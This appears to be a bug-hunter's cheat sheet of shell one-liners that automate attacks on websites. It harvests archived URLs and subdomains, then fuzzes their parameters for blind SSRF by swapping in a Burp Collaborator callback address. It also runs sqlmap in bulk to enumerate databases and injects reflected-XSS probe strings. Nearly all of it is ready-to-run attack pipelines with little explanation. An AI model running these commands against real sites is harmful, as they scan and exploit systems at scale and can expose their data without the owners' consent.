KaleShiri



TOOLS used for the exploitation:
gf (tomnomnom) — https://github.com/tomnomnom/gf
qsreplace(tomnomnom) — https://github.com/tomnomnom/qsreplace)
ffuf — https://github.com/ffuf/ffuf
gau(Corben) — https://github.com/lc/gau
waybackurls(tomnomnom) — https://github.com/tomnomnom/waybackurls



urls from web achieve using waybackurls and gau . Here is command i used for that
Command used:
gau -subs example.com
waybackurls example.com


grep out all the urls containing parameters and sort them uniquely and save it in file. So that can fuzzing for blind ssrf
Command used:
gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt


i used qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf.
.Command used:
cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt
ffuf -c -w ssrfuzz.txt -u FUZZ -t 200



waybackurls google.com | grep "\\.js" | uniq | sort


--------------------------------------------------------------------------------------
Automate finding ssrf:
waybackurl targetme.com >> blindssrftesturl.txt
gau -subs targetme.com >> blindssrftesturl.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
After Getting all URLS we will sort all the URL and resolve it remove false positive:
cat blindssrftesturl.txt | sort -u |anew | httpx |tee -a prefinal_ssrftesturl.txt
cat prefinal_ssrftesturl.txt | gf ssrf >> final_ssrftesturl.txt
cat final_ssrftesturl.txt |qsreplace “Burp collaborator server” >> ssrf_auto-ffuf.txt
ffuf -c -w ssrf_auto-ffuf.txt -u FUZZ



----------------------------------------------------------------------------------------
Automate SQLi
waybackurl targetme.com >> blindssrftesturl.txt
gau -subs targetme.com >> blindssrftesturl.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt
sqlmap -m FUZZvul.txt --random-agent --dbs 


--------------------------------------------------------------------------------------------
reflected xss
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | qsreplace “xsst<>”| httpx -silent >> FUZZvul.txt
xargs -a /root/magicparameter/ssrf.txt -I@ bash -c ‘for url in $(cat FUZZvul.txt); do echo “$url&@=xsst<>”;done’ | httpx -http-proxy http://127.0.0.1:8080


------------------------------------------------------------------------------------------
gau -subs example.com >> vul1.txt
waybackurls example.com >> vul2.txt
subfinder -d example.com -silent | waybackurls >> vul3.txt
cat vul1.txt vuln2.txt vul3.txt | grep “=” | sort -u | grep “?” | httpx -silent >> FUZZvul.txt

---------------------------------------------------------------------------------------
